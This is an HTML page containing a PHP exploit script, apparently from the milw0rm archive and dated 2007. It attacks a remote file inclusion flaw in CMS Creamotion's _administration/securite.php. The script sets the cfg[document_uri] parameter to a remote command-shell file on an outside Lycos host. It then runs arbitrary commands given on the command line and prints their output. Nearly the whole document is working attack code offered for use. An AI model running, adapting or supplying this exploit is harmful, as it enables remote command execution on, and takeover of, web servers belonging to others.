<html><head><title>CMS Creamotion (securite.php) Remote File Inclusion Exploit</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
/*
/*      CMS Creamotion - Remote File include
/*  This exploit should allow you to execute commands
/*            By : HACKERS PAL
/*             WwW.SoQoR.NeT
*/
print_r('
/**********************************************/
/*     CMS Creamotion Command Execution       */
/*    by HACKERS PAL &lt;security@soqor.net&gt;     */
/*         site: http://www.soqor.net         */');
if ($argc&lt;3) {
	print_r('
/* --                                         */
/* Usage: php '.$argv[0].' host
/* Example:                                   */
/*    php '.$argv[0].' http://localhost/ id
/**********************************************/
');
	die;
}
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);

$url=$argv[1];
$cmd=$argv[2];
$exploit=&quot;/_administration/securite.php?cfg[document_uri]=http://members.lycos.co.uk/soqor10/cmd.txt?&quot;;
$page=$url.$exploit;

Function get_page($url)
{

	if(function_exists(&quot;file_get_contents&quot;))
	{

		$contents = file_get_contents($url);
	}
	else
	{
		$fp=fopen(&quot;$url&quot;,&quot;r&quot;);
		while($line=fread($fp,1024))
		{
			$contents=$contents.$line;
		}


	}
	return $contents;
}
$npage    = get_page($page);


if(eregi(&quot;Cannot execute a blank command&quot;,$npage))
{
	$pagecmd=$page.&quot;&amp;cmd=$cmd&quot;;
	Die(&quot;\n[+] Exploit Is Working\n[+] Result For CMD : &quot;.get_page($pagecmd).&quot;\n[+] See The Vulnerabiliy article for more informations\n/*        Visit us : WwW.SoQoR.NeT            */\n/**********************************************/&quot;);
}
Else
{
	Die(&quot;\n[-] Exploit Failed\n/*        Visit us : WwW.SoQoR.NeT            */\n/**********************************************/&quot;);
}
#WwW.SoQoR.NeT
?&gt;

# milw0rm.com [2007-10-06]</pre></html>